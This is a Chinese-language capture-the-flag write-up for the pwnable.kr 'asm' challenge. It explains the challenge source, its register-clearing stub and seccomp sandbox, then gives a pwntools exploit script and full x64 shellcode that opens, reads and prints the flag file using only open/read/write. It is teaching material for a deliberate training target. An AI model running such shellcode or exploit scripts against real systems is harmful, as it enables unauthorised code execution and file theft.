# asm

题目来源：https://pwnable.kr/

这道题是考察的是编写汇编代码的能力，可惜我憨憨，真的想要手编汇编代码，结果搞了半天不知道怎么处理这么长的字符串。

首先进入了服务器后阅读 readme，发现最终要连接的主机是端口的 9026，这个对于写脚本有帮助。随后在该根目录下还有一个名字巨长的文件，打开这个文件查看告诉你，在目标主机上存有 flag 的文件名也是叫这个：`this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`

随后就阅读一下源文件看一下程序的逻辑：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

做完这道题，确实又能学到很多知识点。主函数首先使用 setvbuf 禁用了输入和输出的缓存。

> int setvbuf(FILE *stream, char *buffer, int mode, size_t size)
>
> 这个函数定义了流 stream 应当如何缓冲，比如说针对全缓冲而言，输出时数据在缓冲填满的时候被一次性写入，除非遇到 fflush。

这里不适用缓冲的话，每一个 IO 操作都是即时被写入。

随后在地址 0x41414000 处开辟了一块内存大小为 0x1000 的空间，首先对这片区域初始化为全(0x90)，然后先填充入 stub 中的代码，一开始我对这段代码还是很好奇的，找不到合适的方法去解释。后来学到使用 disasm 去读：

```
>>> from pwn import *
>>> print disasm('\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff')
   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx,ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx,ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx,edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi,esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi,edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp,ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax,eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx,ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx,edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx,ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp,esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp,ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi,esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi,edi
>>>
```

在 pwntools 中就有这个工具，经过反汇编后发现，就是对所有的寄存器清零的一个处理。这时继续看该代码的逻辑，也就是往这段代码的后面继续插入用户定义的 shellcode，长度要求为 1000 以内。chroot 函数为了保证我们可以访问 asm_pwn 下的资源。

sandbox 这个函数是一个比较有趣的函数，这里面用到了许多生僻的结果，主要来源于 `#include <seccomp.h>` 这个文件中。这个库函数的目的是增加进程的安全性，它是 linux 中的一个沙盒机制，可以限制系统调用的访问，这个相当于减少了系统调用暴露给用户的范围。

像在本源文件中，定义了一个 scmp_filter_ctx 结构的过滤器，随后对其进行初始化，初始化一共有两种：

* 参数为 SCMP_ACT_ALLOW：过滤为黑名单模式；
* 参数为 SCMP_ACT_KILL：过滤为白名单模式；

使用 seccomp_rule_add 可以添加规则，最后通过 seccomp_load 来应用添加的规则。*如果对这个的实现有兴趣可以看一下 seccomp 在 linux 中的实现。*

为什么要设置这个，因为如果不设置这个的话，我下意识的想法就是去拿到 shell。但是这里似乎就没法这么简单的操作，只允许你用 read/write/open 三个。**那么想法也很自然，先打开 flag 文件，随后将其内容读到一个缓冲区，最后写到标准输出上**。

这里我确实没有想到，应该把这个内容临时写到哪里，一开始我思考的是把所有的内容都放到这个开辟的空间中，但是不知道具体放在哪里合适，**结果忘记了其实可以放到栈中**，这样只要使用栈顶指针 rsp 就可以操控了。

如下脚本：

```python
from pwn import *                                                                        import time                                                               
conn = remote("pwnable.kr", 9026)                                                                                                                                       print(conn.recv())                                           
print(conn.recv())                                        
context(arch='amd64', os='linux')                    
shellcode=''
shellcode+=shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode+=shellcraft.read('rax', 'rsp', 100)
shellcode+=shellcraft.write(1, 'rsp', 100)
print shellcode                      
conn.send(asm(shellcode))                                        
print conn.recv()
```

这里使用 pwn 中的库shellcraft，这个库就是用来构造合适的 shellcode 的，这样可以方便不用自己手写，因为你会发现下面生成的代码，如果手写起来很麻烦。**主要在使用 shellcraft 的时候一定要选择合适的架构和操作系统！**

---

学习一下**shellcode：**

```asm
/* open(file='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', oflag=0, mode=0) */
/* push 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' */          

    mov rax, 0x101010101010101                                 
    push rax                                                               
    mov rax, 0x101010101010101 ^ 0x676e6f306f306f                      
    xor [rsp], rax                                                      
    mov rax, 0x306f306f306f306f                                              
    push rax                                                               
    mov rax, 0x3030303030303030                    
    push rax                           
    mov rax, 0x303030306f6f6f6f             
    push rax                                                      
    mov rax, 0x6f6f6f6f6f6f6f6f                                               
    push rax                                                     
    mov rax, 0x6f6f6f6f6f6f6f6f                                         
    push rax                                                          
    mov rax, 0x6f6f6f3030303030                        
    push rax                       
    mov rax, 0x3030303030303030              
    push rax                                                      
    mov rax, 0x3030303030303030                                            
    push rax                                                  
    mov rax, 0x303030306f6f6f6f                                        
    push rax                                                           
    mov rax, 0x6f6f6f6f6f6f6f6f                                              
    push rax                                                                     
    mov rax, 0x6f6f6f6f6f6f6f6f                          
    push rax                                                               
    mov rax, 0x6f6f6f6f6f6f6f6f        
    push rax                             
    mov rax, 0x6f6f6f6f6f6f6f6f                   
    push rax                                  
    mov rax, 0x6f6f6f6f6f6f6f6f                 
    push rax                                                  
    mov rax, 0x6f6f6f6f6f6f6f6f             
    push rax                                                               
    mov rax, 0x6f6f6f6f6f6f6f6f                                             
    push rax                                                                   
    mov rax, 0x6f6f6f6f6f6f6f6f                                  
    push rax                                                          
    mov rax, 0x6f6f6f6f6f6f6f6f                                   
    push rax                                                           
    mov rax, 0x6c5f797265765f73                                            
    push rax                               
    mov rax, 0x695f656d616e5f65                                            
    push rax                                                         
    mov rax, 0x6c69665f6568745f                                       
    push rax                                                         
    mov rax, 0x7972726f732e656c                                       
    push rax                                                   
    mov rax, 0x69665f736968745f                                             
    push rax                                                    
    mov rax, 0x646165725f657361                                  
    push rax                                                               
    mov rax, 0x656c705f656c6966                                 
    push rax                                                                  
    mov rax, 0x5f67616c665f726b                           
    push rax                                                       
    mov rax, 0x2e656c62616e7770                                          
    push rax                                                                      
    mov rax, 0x5f73695f73696874                                      
    push rax                                                               
    mov rdi, rsp                                                               
    xor edx, edx /* 0 */                      
    xor esi, esi /* 0 */                                                  
    /* call open() */                                         
    push SYS_open /* 2 */                                                  
    pop rax                                           
    syscall                                                             
    /* call read('rax', 'rsp', 100) */                                
    mov rdi, rax                                                       
    xor eax, eax /* SYS_read */                                     
    push 0x64                                                            
    pop rdx                                                              
    mov rsi, rsp            
    syscall                                                                  
    /* write(fd=1, buf='rsp', n=100) */          
    push 1                                                      
    pop rdi                                                 
    push 0x64                                 
    pop rdx                                                         
    mov rsi, rsp                                        
    /* call write() */                                  
    push SYS_write /* 1 */                            
    pop rax                                                     
    syscall 
```

